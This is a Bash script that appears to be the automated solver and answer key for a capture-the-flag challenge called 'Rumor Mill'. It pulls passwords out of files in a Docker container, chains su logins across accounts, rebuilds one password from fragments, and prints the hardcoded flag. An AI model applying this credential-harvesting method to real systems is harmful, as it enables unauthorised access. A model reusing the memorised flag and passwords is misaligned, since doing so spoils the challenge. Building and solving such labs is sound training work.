#!/usr/bin/env bash
# Rumor Mill — automated solver. Runs every step as y4ss1n3 inside the
# container, derives boul3h14's password from the fragments, prints the real
# flag, exits 0 on success.
set -euo pipefail

CONTAINER="${CONTAINER:-rumor-mill}"
REAL_FLAG='ingehack{su_1s_n0t_4lm1ghty_y0u_kn0w}'

die() { printf 'FAIL: %s\n' "$1" >&2; exit 1; }

su_as() { # target password command
    local target="$1" pw="$2" cmd="$3"
    ( sleep 1.5; printf '%s\n' "$pw" ) | \
        docker exec -i -u y4ss1n3 "$CONTAINER" \
            script -qec "stty -echo; su -c '$cmd' $target" /dev/null 2>&1
}

clean() {
    printf '%s\n' "$1" | tr -d '\r' | sed -e '/^Password: *$/d' -e '/^[[:space:]]*$/d'
}

onboarding="$(docker exec -u y4ss1n3 "$CONTAINER" cat /home/y4ss1n3/onboarding.txt 2>/dev/null)" \
    || die "cannot read onboarding.txt as y4ss1n3"

n0_pw="$(printf '%s' "$onboarding" | grep -o 'K4r4k0_1962' | head -1 || true)"
[ -n "$n0_pw" ] || die "onboarding.txt did not contain n0d4's password"

p1="$(clean "$(su_as n0d4 "$n0_pw" 'cat /home/n0d4/.part1')")"
p2="$(clean "$(su_as n0d4 "$n0_pw" 'cat /home/n0d4/.part2')")"
readme="$(clean "$(su_as n0d4 "$n0_pw" 'cat /home/n0d4/README')")"

[ "$p1" = "h4y" ]   || die ".part1 was '$p1', expected 'h4y'"
[ "$p2" = "3l1y4" ] || die ".part2 was '$p2', expected '3l1y4'"
printf '%s' "$readme" | grep -q 'boul3h14.s password = .part1 + "_" + .part2' \
    || die "README join instruction missing"

b_pw="${p1}_${p2}"

flag="$(clean "$(su_as boul3h14 "$b_pw" 'cat /home/boul3h14/flag.txt')")"

[ "$flag" = "$REAL_FLAG" ] || die "flag mismatch: got '$flag'"

printf '%s\n' "$flag"
exit 0
